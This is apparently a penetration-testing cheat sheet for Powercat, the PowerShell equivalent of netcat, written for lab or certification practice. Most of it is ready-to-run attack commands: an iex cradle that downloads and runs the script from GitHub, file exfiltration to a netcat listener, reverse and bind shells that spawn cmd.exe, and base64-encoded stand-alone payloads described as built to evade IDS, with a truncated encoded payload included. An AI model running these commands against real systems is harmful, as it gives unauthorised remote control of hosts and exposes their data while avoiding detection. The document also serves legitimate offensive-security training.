# Powercat

**Powercat** is essentially the PowerShell version of netcat. Powercat can be installed in Kali with `sudo apt install powercat`, which will place the script in `/usr/share/windows-resources/powercat`.

Options:
* `-c` client mode. Provide an IP to connect to
* `-l` listen mode. Specify the listener port with `-p`
* `-p` specify the port
* `-e` specify the process to start
* `-h` show powercat help


## Dotsource to use as a command

Once you've transferred the file, run the following:

```powershell
. .\powercat.ps1
```



## Or install remotely

With the following:

```powershell
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```



## Powercat file transfers

Set up a listener on the receiving computer:

```bash
sudo nc -nvlp 443 > receiving_powercat.ps1
```

Then send with powercat:

```powershell
powercat -c 10.10.10.1 -p 443 -i C:\Users\Offsec\powercat.ps1
```

Then `^c` the process once transfer is complete.



## Powercat reverse shells

Create a listener on kali:

```bash
sudo nc -nvlp 443
```

Then send a reverse shell with powercat:

```powershell
powercat -c 192.168.119.193 -p 443 -e cmd.exe
```



## Powercat bind shells

Set up a listener on the target computer

```powershell
powercat -l -p 443 -e cmd.exe
powercat -l -p 4446 -e cmd.exe -ge > encbindshell.ps1
```

And connect from the attacking computer

```bash
nc 10.10.10.1 443
```



## Standalone Payloads

Powercat can also generate stand-alone payloads. For powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user.

After starting a listener on the target magine, we create a stand-alone reverse shell payload by adding the `-g ` option and redirecting the output to a file. This will produce a powershell script that can be executed on the target machine. The `-ge` flag uses base64 to encode the payload so that it doesn't get caught by IDS. It then needs to be executed

```powershell
# Not encoded, low success rate
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

./reverseshell.ps1

# Encoded
powercat -c 192.168.119.193 -p 443 -e cmd.exe -ge > encrevshell.ps1

powershell.exe -E gB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAE-snip-
```

Then receive on the listener:

```bash
sudo nc -nvlp 443
```

